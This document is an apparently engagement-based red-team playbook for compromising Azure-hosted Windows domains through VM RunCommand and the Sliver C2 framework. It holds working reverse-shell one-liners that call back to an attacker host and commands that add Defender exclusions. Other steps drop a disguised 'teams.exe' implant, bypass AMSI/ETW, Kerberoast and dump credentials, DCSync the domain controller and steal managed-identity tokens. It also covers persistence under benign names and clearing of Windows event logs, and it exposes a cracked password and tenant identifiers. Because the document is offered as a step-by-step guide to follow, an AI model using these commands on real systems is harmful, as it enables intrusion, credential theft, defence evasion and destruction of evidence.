# Azure RunCommand + Sliver C2 — Proven Attack Path

Engagement-proven kill chain. Every command validated live. Follow in order.

## ⚡ Quick Reference (Speed Run)

```bash
# 1. Auth
az login --service-principal -u CLIENT_ID -p SECRET --tenant TENANT

# 2. Reverse shell (replace YOUR_KALI_IP)
az vm run-command create --name "sh-$(date +%s)" --vm-name TARGET_VM \
  --resource-group RG --async-execution true --timeout-in-seconds 86400 \
  --script '$c=New-Object Net.Sockets.TcpClient("YOUR_KALI_IP",8080);$s=$c.GetStream();$w=New-Object IO.StreamWriter($s);$w.AutoFlush=$true;$r=New-Object IO.StreamReader($s);while($c.Connected){$cmd=$r.ReadLine();if($cmd -eq "exit"){break};try{$o=iex $cmd 2>&1|Out-String;$w.Write($o)}catch{$w.Write($_.Exception.Message)};$w.Write("> ")}'

# 3. Defender exclusion + drop implant (from shell)
Add-MpPreference -ExclusionPath "C:\ProgramData\Microsoft\Network"
Invoke-WebRequest -Uri "http://YOUR_KALI_IP:8888/teams.exe" -OutFile "C:\ProgramData\Microsoft\Network\teams.exe"
Start-Process "C:\ProgramData\Microsoft\Network\teams.exe"

# 4. Lateral (from Sliver session on httpserver)
execute -o powershell -c "Invoke-Command -ComputerName blueDBServer -Credential (New-Object PSCredential('contoso\svc.mssql',(ConvertTo-SecureString 'PASSWORD' -AsPlainText -Force))) -ScriptBlock {whoami}"

# 5. DC dump via RunCommand
az vm run-command create --name "dc-$(date +%s)" --vm-name blueDC-01 \
  --resource-group RG --timeout-in-seconds 120 \
  --script "Import-Module ActiveDirectory; Get-ADUser -Filter * -Properties ServicePrincipalName | Select Name,SamAccountName,Enabled,ServicePrincipalName | FT"
```

---

## Full Kill Chain

```
Kali Setup (build Sliver, import profile, start listener)
   |
   v
Generate Harriet-wrapped implant (teams.exe)
   |
   v
RunCommand v2 --> drop teams.exe on httpserver (10.1.0.10) --> SYSTEM
   |
   v  (if Defender blocks)
   Fallback: nc reverse shell via RunCommand
   --> Add Defender exclusion path
   --> Re-drop Sliver implant
   |
   v
Beacon checks in --> interactive session
   |
   v
Domain enum: users, groups, SPNs, computers, port scan
   |
   v
Kerberoast svc.mssql --> crack offline --> GY2W*%m!P%0HK
   |
   v
mimikatz / LSA secrets --> confirm DA creds
   |
   v
WinRM lateral movement --> blueDBServer (10.1.0.100)
   |
   v
DB access, DC takeover via RunCommand, Entra Connect enum
```

### Environment

| Asset | IP |
|-------|-----|
| httpserver | blueHttpServer / 10.1.0.10 |
| DBServer | blueDBServer / 10.1.0.100 |
| Domain Controller | blueDC-01 / 10.1.0.5 |
| EntraConnect | blueEntraC-01 / 10.1.0.25 |
| FileServer | blueFileServer / 10.1.0.20 |
| Domain | contoso.range |
| Subscription | `5152d66b-be33-42c3-b579-d9f723849d41` |
| Resource Group | RGCORPSERVERS |

**Critical**: All VMs have NO outbound internet. RunCommand is the only way in.

---

## Step 0: Prerequisites

### Install Az CLI (Kali/Linux)

```bash
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash
```

### Install Az PowerShell Module (Windows)

```powershell
Install-Module -Name Az -Repository PSGallery -Force -Scope CurrentUser
Import-Module Az
```

---

## Step 1: Kali Setup

### 1a: Build Sliver

```bash
git clone https://github.com/mgstate/sliver.git ~/sliver
cd ~/sliver
bash setup.sh
```

This installs Go, MinGW, Harriet, builds Sliver, downloads tools (LSA Whisperer, impacket, pypykatz, netexec), and creates helper scripts.

### 1b: Start Server + Listener

```bash
cd ~/sliver
./start.sh
```

This auto-kills orphan processes, starts the daemon, creates operator config, imports the microsoft365 C2 profile (first run), starts mTLS on 8888, and drops you into the interactive console.

For HTTPS too:
```bash
./start.sh --domain cdn.yourdomain.com
```

### 1c: Armory Extensions

`start.sh` auto-installs these on first run (marker: `~/.sliver/.armory_installed`):
- windows-credentials, kerberos, situational-awareness
- windows-pivot, windows-bypass
- .net-pivot, .net-recon, .net-execute

To manually install more:
```
armory install <bundle-name>
```

---

## Step 2: Generate Harriet-Wrapped Implant

```
# Generate beacon shellcode
generate beacon --mtls YOUR_C2_IP:8888 --os windows --arch amd64 \
  --format shellcode --evasion --c2profile microsoft365 \
  --seconds 60 --jitter 30 --strategy r --save /tmp/beacon.bin

# Wrap with Harriet (DirectSyscalls = most evasive)
harriet --shellcode /tmp/beacon.bin --method directsyscall \
  --format exe --output /tmp/teams.exe \
  --harriet-path /opt/Home-Grown-Red-Team/Harriet
```

You now have `/tmp/teams.exe` — AES-encrypted, code-signed Sliver beacon.

---

## Step 3: Authenticate with Az CLI

### 3a: Service Principal Login

**Az CLI (Kali/Linux):**
```bash
az login --service-principal \
    --username "CLIENT_ID_HERE" \
    --password "CLIENT_SECRET_HERE" \
    --tenant "TENANT_ID_HERE"

# Example with real values:
az login --service-principal \
    --username "a1b2c3d4-e5f6-7890-abcd-ef1234567890" \
    --password "MySecretValue123" \
    --tenant "MngEnvMCAP969165.onmicrosoft.com"
```

**PowerShell (Az Module):**
```powershell
$cred = New-Object PSCredential("CLIENT_ID_HERE", (ConvertTo-SecureString "CLIENT_SECRET_HERE" -AsPlainText -Force))
Connect-AzAccount -ServicePrincipal -Credential $cred -TenantId "TENANT_ID_HERE"

# Example:
$cred = New-Object PSCredential("a1b2c3d4-e5f6-7890-abcd-ef1234567890", (ConvertTo-SecureString "MySecretValue123" -AsPlainText -Force))
Connect-AzAccount -ServicePrincipal -Credential $cred -TenantId "MngEnvMCAP969165.onmicrosoft.com"
```

### 3b: Device Code Flow (Interactive — Useful for Phished Tokens)

**Az CLI:**
```bash
az login --use-device-code --tenant "TENANT_ID_HERE"
```

**PowerShell:**
```powershell
Connect-AzAccount -UseDeviceAuthentication -TenantId "TENANT_ID_HERE"
```

### 3c: Managed Identity (From Inside an Azure VM)

**Az CLI:**
```bash
az login --identity
```

**PowerShell:**
```powershell
Connect-AzAccount -Identity
```

### 3d: Set Subscription + Verify

**Az CLI:**
```bash
az account set --subscription "a985babf-347f-4ad4-bac5-510c6decd9d9"
az account show -o table
az vm list -g RGCORPSERVERS -o table
az role assignment list --assignee "CLIENT_ID" --subscription "a985babf-347f-4ad4-bac5-510c6decd9d9" -o table
```

**PowerShell:**
```powershell
Set-AzContext -SubscriptionId "a985babf-347f-4ad4-bac5-510c6decd9d9"
Get-AzContext | Format-Table
Get-AzVM -ResourceGroupName "RGCORPSERVERS" | Format-Table Name, Location, ProvisioningState
Get-AzRoleAssignment -SignInName "CLIENT_ID" | Format-Table RoleDefinitionName, Scope
```

> **Note**: Az CLI and Az PowerShell installation moved to Step 0 (Prerequisites).

---

## Step 4: Get a Shell via RunCommand

Start with a reverse shell first — faster to iterate, and lets you add Defender exclusions before dropping the real implant.

### 4a: Start NC Listener on Kali

```bash
nc -lvnp 8080
```

### 4b: Deploy Reverse Shell

**Az CLI:**
```bash
az vm run-command create \
    --name "revshell-$(date +%s)" \
    --vm-name "blueHttpServer" \
    --resource-group "RGCORPSERVERS" \
    --subscription "a985babf-347f-4ad4-bac5-510c6decd9d9" \
    --location "westus3" \
    --async-execution true \
    --timeout-in-seconds 86400 \
    --script '$c=New-Object Net.Sockets.TcpClient("YOUR_KALI_IP",8080);$s=$c.GetStream();$w=New-Object IO.StreamWriter($s);$w.AutoFlush=$true;$r=New-Object IO.StreamReader($s);$w.WriteLine("PS "+$env:COMPUTERNAME+"\"+(Get-Location).Path+"> ");while($c.Connected){$cmd=$r.ReadLine();if($cmd -eq "exit"){break};try{$o=(iex $cmd 2>&1|Out-String);$w.Write($o)}catch{$w.Write($_.Exception.Message)};$w.WriteLine("`nPS "+$env:COMPUTERNAME+"\"+(Get-Location).Path+"> ")}'
```

**PowerShell (Az Module):**
```powershell
$script = '$c=New-Object Net.Sockets.TcpClient("YOUR_KALI_IP",8080);$s=$c.GetStream();$w=New-Object IO.StreamWriter($s);$w.AutoFlush=$true;$r=New-Object IO.StreamReader($s);$w.WriteLine("PS "+$env:COMPUTERNAME+"\\"+(Get-Location).Path+"> ");while($c.Connected){$cmd=$r.ReadLine();if($cmd -eq "exit"){break};try{$o=(iex $cmd 2>&1|Out-String);$w.Write($o)}catch{$w.Write($_.Exception.Message)};$w.WriteLine("`nPS "+$env:COMPUTERNAME+"\\"+(Get-Location).Path+"> ")}'

Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" `
    -CommandId "RunPowerShellScript" -ScriptString $script
```

You should get a shell back as `NT AUTHORITY\SYSTEM`.

### 4c: Add Defender Exclusion (From NC Shell)

```powershell
Add-MpPreference -ExclusionPath "C:\ProgramData\Microsoft\Network"
Add-MpPreference -ExclusionProcess "teams.exe"
Get-MpPreference | Select -ExpandProperty ExclusionPath
```

### 4d: Drop Sliver Implant (From NC Shell)

```powershell
# Create directory
New-Item -Type Directory "C:\ProgramData\Microsoft\Network" -Force

# Download from your C2/web server
Invoke-WebRequest -Uri "http://YOUR_KALI_IP:8888/teams.exe" -OutFile "C:\ProgramData\Microsoft\Network\teams.exe" -UseBasicParsing

# Or base64 decode if no HTTP path
$b=[Convert]::FromBase64String("BASE64_HERE")
[IO.File]::WriteAllBytes("C:\ProgramData\Microsoft\Network\teams.exe",$b)

# Execute
Start-Process "C:\ProgramData\Microsoft\Network\teams.exe"
```

### 4e: Alternative — Direct Drop (If Defender Is Off)

If you know Defender won't block (or exclusion is already set):

**Az CLI:**
```bash
B64=$(base64 -w0 /tmp/teams.exe)

az vm run-command create \
    --name "deploy-$(date +%s)" \
    --vm-name "blueHttpServer" \
    --resource-group "RGCORPSERVERS" \
    --subscription "a985babf-347f-4ad4-bac5-510c6decd9d9" \
    --location "westus3" \
    --async-execution true \
    --timeout-in-seconds 86400 \
    --script "\$b=[Convert]::FromBase64String('$B64');New-Item -Type Directory 'C:\ProgramData\Microsoft\Network' -Force|Out-Null;[IO.File]::WriteAllBytes('C:\ProgramData\Microsoft\Network\teams.exe',\$b);Start-Process 'C:\ProgramData\Microsoft\Network\teams.exe'"
```

**PowerShell (Az Module):**
```powershell
$b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\path\to\teams.exe"))

$script = @"
`$b=[Convert]::FromBase64String('$b64')
New-Item -Type Directory 'C:\ProgramData\Microsoft\Network' -Force | Out-Null
[IO.File]::WriteAllBytes('C:\ProgramData\Microsoft\Network\teams.exe',`$b)
Start-Process 'C:\ProgramData\Microsoft\Network\teams.exe'
"@

Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" `
    -CommandId "RunPowerShellScript" -ScriptString $script
```

### 4f: Add Defender Exclusion (No Shell Needed)

**Az CLI:**
```bash
az vm run-command create \
    --name "exclude-$(date +%s)" \
    --vm-name "blueHttpServer" \
    --resource-group "RGCORPSERVERS" \
    --subscription "a985babf-347f-4ad4-bac5-510c6decd9d9" \
    --location "westus3" \
    --script "Add-MpPreference -ExclusionPath 'C:\ProgramData\Microsoft\Network'; Add-MpPreference -ExclusionProcess 'teams.exe'"
```

**PowerShell (Az Module):**
```powershell
Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" `
    -CommandId "RunPowerShellScript" `
    -ScriptString "Add-MpPreference -ExclusionPath 'C:\ProgramData\Microsoft\Network'; Add-MpPreference -ExclusionProcess 'teams.exe'"
```

### 4g: List / Delete RunCommands (Cleanup — Max 25 Per VM)

**Az CLI:**
```bash
# List all RunCommands on a VM
az vm run-command list --vm-name "blueHttpServer" --resource-group "RGCORPSERVERS" -o table

# Delete a specific one
az vm run-command delete --name "revshell-1234567890" --vm-name "blueHttpServer" --resource-group "RGCORPSERVERS" --yes

# Check result of a RunCommand
az vm run-command show --name "deploy-1234567890" --vm-name "blueHttpServer" --resource-group "RGCORPSERVERS" --expand instanceView
```

**PowerShell (Az Module):**
```powershell
# List
Get-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" | Format-Table Name, ProvisioningState

# Delete
Remove-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" -RunCommandName "revshell-1234567890"

# Check result
Get-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" -RunCommandName "deploy-1234567890" -Expand InstanceView
```

---

## Step 5: Verify Beacon + Go Interactive

```
# Check for beacon
beacons

# Use the beacon
use <BEACON_ID>

# Upgrade to interactive session (faster, but noisier)
interactive
```

From here everything runs through the Sliver session.

---

## Step 6: Domain Enumeration

```
# Bypass AMSI + ETW first
inject-amsi-bypass
inject-etw-bypass

# Who am I?
sa-whoami
getprivs

# Domain info
execute -o "nltest /dclist:contoso.range"
execute -o "nltest /domain_trusts"

# All domain users
sa-ldapsearch "(objectClass=user)" sAMAccountName,memberOf

# Domain Admins
sa-netgroup "Domain Admins" /domain

# Local admins on this box
sa-netlocalgroup Administrators

# All computers
sa-ldapsearch "(objectClass=computer)" cn,dNSHostName,operatingSystem

# Find SPNs (kerberoast targets)
sa-ldapsearch "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName,servicePrincipalName

# AV/EDR check
sa-driversigs
sa-enum-filter-driver
```

### Port Scan Internal Network

```
portscan --host 10.1.0.100 --ports 445,5985,3389,1433,135
portscan --host 10.1.0.5 --ports 445,5985,3389,88,389
portscan --host 10.1.0.25 --ports 445,5985,3389
portscan --host 10.1.0.20 --ports 445,5985,3389
```

**Result**: Port 5985 (WinRM) open on blueDBServer. Found `svc.mssql` with SPN `MSSQLSvc/blueDBServer.contoso.range:1433`.

---

## Step 7: Kerberoast

```
# nanorobeus (BOF — fastest, in-process, no .NET)
nanorobeus kerberoast

# Or rubeus (.NET — more output control)
rubeus -- kerberoast /format:hashcat /nowrap

# Or bof-roast (BOF alternative)
bof-roast MSSQLSvc/blueDBServer.contoso.range:1433
```

Copy the hash.

---

## Step 8: Crack Offline

On Kali:
```bash
# Save the $krb5tgs$23$ hash to a file
echo '$krb5tgs$23$*svc.mssql$contoso.range$...' > hash.txt

# Crack with hashcat
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Or john
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Result**: `svc.mssql` password: `GY2W*%m!P%0HK`

---

## Step 9: Credential Dump — Confirm + Collect More

```
# mimikatz (reflectively loaded in-process)
mimikatz sekurlsa::logonpasswords
mimikatz lsadump::sam
mimikatz lsadump::secrets

# Or nanodump (LSASS dump via syscalls — more evasive)
nanodump -- --write C:\Windows\Temp\debug.dmp --valid
download C:\Windows\Temp\debug.dmp
# On Kali: pypykatz lsa minidump debug.dmp

# Or sharpsecdump (remote SAM/LSA — no files on disk)
sharpsecdump -- -target=localhost

# Or hashdump (built-in Sliver — quick SAM)
hashdump

# LSA Whisperer (works with Credential Guard — Sliver execute-assembly)
execute-assembly --in-process /opt/tools/lsa-whisperer/build/lsa-whisperer.exe --msv credkey
```

**Result**: Confirmed `contoso\svc.mssql` = Domain Admin with password `GY2W*%m!P%0HK`.

---

## Step 10: Lateral Movement — WinRM to DBServer

### 10a: Test Access

```
execute -o powershell -c "Test-WSMan -ComputerName blueDBServer -ErrorAction SilentlyContinue"
```

### 10b: Execute Commands on DBServer

```
# Quick command via WinRM
execute -o powershell -c "Invoke-Command -ComputerName blueDBServer -Credential (New-Object PSCredential('contoso\svc.mssql',(ConvertTo-SecureString 'GY2W*%m!P%0HK' -AsPlainText -Force))) -ScriptBlock {whoami /all; hostname}"
```

**Result**: `contoso\svc.mssql` confirmed Domain Admin on DBServer.

### 10c: Deploy Pivot Implant on DBServer

```
# Generate TCP pivot implant (routes back through httpserver)
generate --tcp-pivot 10.1.0.10:8888 --os windows --arch amd64 --skip-symbols --name db-pivot --save /tmp/db-pivot.exe

# Start TCP pivot listener on httpserver
pivots tcp --bind 0.0.0.0:8888

# Upload + execute on DBServer via WinRM
execute -o powershell -c "$cred=New-Object PSCredential('contoso\svc.mssql',(ConvertTo-SecureString 'GY2W*%m!P%0HK' -AsPlainText -Force));$b=[IO.File]::ReadAllBytes('C:\Windows\Temp\db-pivot.exe');Invoke-Command -ComputerName blueDBServer -Credential $cred -ScriptBlock {param($b)[IO.File]::WriteAllBytes('C:\Windows\Temp\svc-update.exe',$b);Start-Process 'C:\Windows\Temp\svc-update.exe'} -ArgumentList (,$b)"
```

### 10d: Verify Pivot

```
sessions
use <DB_SESSION_ID>
sa-whoami
```

**Result**: Two sessions — httpserver (direct) + DBServer (TCP pivot).

---

## Step 11: Post-Exploitation on DBServer

```
# SQL Server access
execute -o sqlcmd -S localhost -Q "SELECT name FROM sys.databases"
execute -o sqlcmd -S localhost -Q "SELECT * FROM sys.sql_logins"
execute -o sqlcmd -S localhost -Q "SELECT name,data_source FROM sys.servers WHERE is_linked=1"

# Dump creds on DBServer too
mimikatz sekurlsa::logonpasswords
hashdump

# Network recon from DBServer vantage point
portscan --host 10.1.0.5 --ports 445,5985,3389,88,389
portscan --host 10.1.0.20 --ports 445,5985,3389
```

---

## Step 12: DC Takeover via RunCommand

We have Contributor on the subscription, so RunCommand works on the DC directly.

### 12a: Full AD Dump

**Az CLI:**
```bash
az vm run-command create \
    --name "dc-recon-$(date +%s)" \
    --vm-name "blueDC-01" \
    --resource-group "RGCORPSERVERS" \
    --subscription "a985babf-347f-4ad4-bac5-510c6decd9d9" \
    --location "westus3" \
    --timeout-in-seconds 120 \
    --script "Import-Module ActiveDirectory; Get-ADUser -Filter * -Properties MemberOf,ServicePrincipalName | Select Name,SamAccountName,Enabled,ServicePrincipalName | Format-Table -AutoSize; Get-ADGroupMember 'Domain Admins' | Select SamAccountName; Get-ADComputer -Filter * -Properties IPv4Address | Select Name,IPv4Address | Format-Table"
```

**PowerShell (Az Module):**
```powershell
$adScript = @"
Import-Module ActiveDirectory
Get-ADUser -Filter * -Properties MemberOf,ServicePrincipalName | Select Name,SamAccountName,Enabled,ServicePrincipalName | Format-Table -AutoSize
Get-ADGroupMember 'Domain Admins' | Select SamAccountName
Get-ADComputer -Filter * -Properties IPv4Address | Select Name,IPv4Address | Format-Table
"@

$result = Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueDC-01" `
    -CommandId "RunPowerShellScript" -ScriptString $adScript
$result.Value[0].Message   # stdout
$result.Value[1].Message   # stderr
```

### 12b: DCSync (If You Have a Session on DC)

```
mimikatz lsadump::dcsync /user:contoso\krbtgt
mimikatz lsadump::dcsync /user:contoso\Administrator
```

### 12c: Deploy Sliver on DC via RunCommand

**Az CLI:**
```bash
az vm run-command create \
    --name "dc-implant-$(date +%s)" \
    --vm-name "blueDC-01" \
    --resource-group "RGCORPSERVERS" \
    --subscription "a985babf-347f-4ad4-bac5-510c6decd9d9" \
    --location "westus3" \
    --async-execution true \
    --timeout-in-seconds 86400 \
    --script "Add-MpPreference -ExclusionPath 'C:\ProgramData\Microsoft\Network'; New-Item -Type Directory 'C:\ProgramData\Microsoft\Network' -Force | Out-Null; Invoke-WebRequest -Uri 'http://YOUR_KALI_IP:8888/teams.exe' -OutFile 'C:\ProgramData\Microsoft\Network\teams.exe' -UseBasicParsing; Start-Process 'C:\ProgramData\Microsoft\Network\teams.exe'"
```

**PowerShell (Az Module):**
```powershell
$deployScript = @"
Add-MpPreference -ExclusionPath 'C:\ProgramData\Microsoft\Network'
New-Item -Type Directory 'C:\ProgramData\Microsoft\Network' -Force | Out-Null
Invoke-WebRequest -Uri 'http://YOUR_KALI_IP:8888/teams.exe' -OutFile 'C:\ProgramData\Microsoft\Network\teams.exe' -UseBasicParsing
Start-Process 'C:\ProgramData\Microsoft\Network\teams.exe'
"@

Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueDC-01" `
    -CommandId "RunPowerShellScript" -ScriptString $deployScript
```

### 12d: Managed Identity Tokens

Steal MI tokens from any VM with managed identity assigned.

> **Important**: Not all VMs have managed identities. Check first with `az vm identity show --name VM --resource-group RG`. If the VM has no identity assigned, the IMDS token endpoint will return 400. System-assigned and user-assigned identities both work — system-assigned is more common. The stolen token inherits whatever RBAC roles the managed identity has (often Contributor on the subscription).

**Az CLI:**
```bash
az vm run-command create \
    --name "mi-token-$(date +%s)" \
    --vm-name "blueDC-01" \
    --resource-group "RGCORPSERVERS" \
    --subscription "a985babf-347f-4ad4-bac5-510c6decd9d9" \
    --location "westus3" \
    --timeout-in-seconds 30 \
    --script "\$r=Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com' -Headers @{Metadata='true'} -UseBasicParsing; \$r.Content"
```

**PowerShell (Az Module):**
```powershell
$miScript = @"
`$r = Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com' -Headers @{Metadata='true'} -UseBasicParsing
`$r.Content
"@

$result = Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueDC-01" `
    -CommandId "RunPowerShellScript" -ScriptString $miScript
$result.Value[0].Message | ConvertFrom-Json   # parse the token JSON
```

### 12e: EntraConnect ADSync

**Az CLI:**
```bash
az vm run-command create \
    --name "adsync-$(date +%s)" \
    --vm-name "blueEntraC-01" \
    --resource-group "RGCORPSERVERS" \
    --subscription "a985babf-347f-4ad4-bac5-510c6decd9d9" \
    --location "westus3" \
    --timeout-in-seconds 60 \
    --script "Get-ADSyncConnector | Select Name,Type | Format-Table; Get-ADSyncScheduler | Format-List"
```

**PowerShell (Az Module):**
```powershell
$result = Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueEntraC-01" `
    -CommandId "RunPowerShellScript" `
    -ScriptString "Get-ADSyncConnector | Select Name,Type | Format-Table; Get-ADSyncScheduler | Format-List"
$result.Value[0].Message
```

---

## Step 13: Persistence

```
# On httpserver
sharpersist -- -t schtask -c "C:\ProgramData\Microsoft\Network\teams.exe" -n "DiagCheck" -m add -o logon
sharpersist -- -t reg -c "C:\ProgramData\Microsoft\Network\teams.exe" -k "hklmrun" -v "DiagTrack" -m add

# On DBServer (remote BOF)
remote-schtaskscreate blueDBServer DiagCheck "C:\Windows\Temp\svc-update.exe"
```

---

## Step 14: Cleanup

### 14a: Remove Persistence + Implants (From Sliver Sessions)

```
# Remove persistence
execute -o schtasks /delete /tn "Microsoft\Windows\NetTrace\DiagCheck" /f
execute -o reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v DiagTrack /f

# Remove implants
rm C:\ProgramData\Microsoft\Network\teams.exe
rm C:\Windows\Temp\svc-update.exe
rm C:\Windows\Temp\*.dmp

# Remove Defender exclusion
execute -o powershell -c "Remove-MpPreference -ExclusionPath 'C:\ProgramData\Microsoft\Network'"

# Clear logs
execute -o "wevtutil cl Security"
execute -o "wevtutil cl System"
execute -o "wevtutil cl Microsoft-Windows-PowerShell/Operational"

# Kill beacons
rev2self
exit
```

### 14b: Delete All RunCommands from Azure

**Az CLI:**
```bash
# List all RunCommands on each VM
for VM in blueHttpServer blueDC-01 blueEntraC-01; do
    echo "=== $VM ==="
    az vm run-command list --vm-name "$VM" --resource-group "RGCORPSERVERS" -o table
done

# Delete specific RunCommands
az vm run-command delete --name "revshell-TIMESTAMP" --vm-name "blueHttpServer" --resource-group "RGCORPSERVERS" --yes
az vm run-command delete --name "deploy-TIMESTAMP" --vm-name "blueHttpServer" --resource-group "RGCORPSERVERS" --yes
az vm run-command delete --name "exclude-TIMESTAMP" --vm-name "blueHttpServer" --resource-group "RGCORPSERVERS" --yes
az vm run-command delete --name "dc-recon-TIMESTAMP" --vm-name "blueDC-01" --resource-group "RGCORPSERVERS" --yes
az vm run-command delete --name "dc-implant-TIMESTAMP" --vm-name "blueDC-01" --resource-group "RGCORPSERVERS" --yes
az vm run-command delete --name "mi-token-TIMESTAMP" --vm-name "blueDC-01" --resource-group "RGCORPSERVERS" --yes
az vm run-command delete --name "adsync-TIMESTAMP" --vm-name "blueEntraC-01" --resource-group "RGCORPSERVERS" --yes
```

**PowerShell (Az Module):**
```powershell
# List all RunCommands on each VM
foreach ($vm in @("blueHttpServer", "blueDC-01", "blueEntraC-01")) {
    Write-Host "=== $vm ===" -ForegroundColor Cyan
    Get-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName $vm | Format-Table Name, ProvisioningState
}

# Delete all RunCommands on a VM (bulk cleanup)
$vm = "blueHttpServer"
Get-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName $vm | ForEach-Object {
    Write-Host "Deleting $($_.Name)..."
    Remove-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName $vm -RunCommandName $_.Name -NoWait
}
```

**Note**: Max 25 RunCommands per VM. Delete old ones or Azure will reject new ones.

## Multi-Environment Results (March 2026)

### Environments
| Env | Tenant | Subscription | SP Token | Status |
|-----|--------|-------------|----------|--------|
| RCCE2 | 03bbaf8b (rcce2.mscyberlab.com) | 5152d66b | SP:ff1e0fc8 | ✅ FULL LATERAL |
| SiteA | 527c0d4b (sitea.everlinesystems.com) | a985babf | SP:9d1e53c7 | ⚠️ Different password |
| RCCE | 146ea19f (rcce.mscyberlab.com) | 1336b602 | SP:2df2b8ab | ❌ DC broken |

### RCCE2 — Full Kill Chain Proven (httpserver RunCommand ONLY)
```
RunCommand on blueHttpServer → SYSTEM
  [1] DC online, Domain Admins: adm.contoso, azureuser
  [2] SPNs: MSSQLSvc/blueDBServer.contoso.range:1433, :SQLEXPRESS, :50101
  [3] Ports open: 1433 ✅, 3389 ✅, 5985 ✅ (135, 445 closed)
  [4] Kerberoast: svc.mssql TGS captured
  [5] KeyVault: MI tokens acquired but subscription query malformed
  [6] WinRM lateral with known password GY2W*%m!P%0HK → SUCCESS
      → contoso\svc.mssql on blueDBServer
      → SQL sysadmin, DBs: master/tempdb/model/msdb/AdventureWorks
      → Local admins: azureuser, CONTOSO\Domain Admins, svcbackup
```

### SiteA — Partial (password differs)
```
RunCommand on blueHttpServer → SYSTEM
  [1] DC online, kerberoast succeeded
  [2] Ports: all still closed from httpserver (firewall GPO deployed but may not have propagated)
  [3] KeyVault: kvBlueRangeSecrets + kvBlobSecrets discovered but private endpoint only
  [4] MI vault token acquired but no vault read permission
  [5] Known RCCE2 password DOES NOT WORK in SiteA
  [6] Need to access KeyVault from inside VNet via RunCommand on httpserver
```

### RCCE — Dead
```
  DC completely offline, no domain services
  All ports to dbserver closed
  No DNS resolution, no kerberoast possible
  MI failed: management.azure.com not resolvable (no internet)
```

### Key Findings
1. **svc.mssql password differs per environment** — don't assume RCCE2 password works elsewhere
2. **KeyVaults use private endpoints** — must access from VNet (httpserver RunCommand), not externally
3. **RunCommand queue management is critical** — max 25 per VM, deletions take 5-15 minutes
4. **Evil-WinRM / Invoke-Command is the lateral move path** — port 5985 must be open
5. **SP cert tokens auto-refresh via Meatball** — refresh_token field contains `SP_CERT:` prefix

### Tools Installed on Attack Box (20.96.91.180)
- **Sliver C2** v1.5.43 — mTLS on 8082+8888, daemon on 31337
- **evil-winrm** v3.9 — `~/.local/share/gem/ruby/3.2.0/bin/evil-winrm`
- **impacket** — secretsdump.py, smbclient.py at /usr/local/bin/
- **netexec** (nxc) — /usr/local/bin/nxc
- **Meatball** on port 9999 — token management, SP cert refresh

### Deploy Scripts
Created in `/home/mgstate1/sliver-new/deploy-scripts/`:
- `one-liner.txt` — Copy-paste RunCommand deployment commands per environment
- `lateral-winrm.ps1` — Kerberoast + WinRM lateral move script
- `kv-extract.ps1` — KeyVault secret extraction script

### Lateral Movement via Evil-WinRM (from Sliver SOCKS or direct)
```bash
# From httpserver nc shell (PowerShell Invoke-Command):
$cred = New-Object PSCredential('contoso\svc.mssql', (ConvertTo-SecureString 'PASSWORD' -AsPlainText -Force))
Invoke-Command -ComputerName blueDBServer -Credential $cred -ScriptBlock { whoami; hostname }

# Interactive session:
$sess = New-PSSession -ComputerName blueDBServer -Credential $cred
Enter-PSSession $sess

# From attack box via Sliver SOCKS proxy:
# sliver> socks5 start -p 1080
# proxychains evil-winrm -i 10.1.0.100 -u 'contoso\svc.mssql' -p 'PASSWORD'

# From attack box with evil-winrm directly (if route exists):
evil-winrm -i 10.1.0.100 -u 'svc.mssql' -p 'PASSWORD'
```

### Actions on DBServer (post-lateral move)
```powershell
# SQL enumeration
$c = New-Object System.Data.SqlClient.SqlConnection
$c.ConnectionString = 'Server=localhost;Integrated Security=True'
$c.Open()
# List databases
$cmd = $c.CreateCommand(); $cmd.CommandText = 'SELECT name FROM sys.databases'; $rd = $cmd.ExecuteReader(); while($rd.Read()){$rd[0]}; $rd.Close()
# Check sysadmin
$cmd2 = $c.CreateCommand(); $cmd2.CommandText = "SELECT IS_SRVROLEMEMBER('sysadmin')"; $cmd2.ExecuteScalar()
# xp_cmdshell (if sysadmin)
$cmd3 = $c.CreateCommand(); $cmd3.CommandText = "EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;"; $cmd3.ExecuteNonQuery()
$cmd4 = $c.CreateCommand(); $cmd4.CommandText = "EXEC xp_cmdshell 'whoami'"; $rd4 = $cmd4.ExecuteReader(); while($rd4.Read()){$rd4[0]}
# Linked servers
$cmd5 = $c.CreateCommand(); $cmd5.CommandText = 'SELECT name, data_source FROM sys.servers WHERE is_linked=1'; $rd5 = $cmd5.ExecuteReader(); while($rd5.Read()){"$($rd5[0]) -> $($rd5[1])"}
```
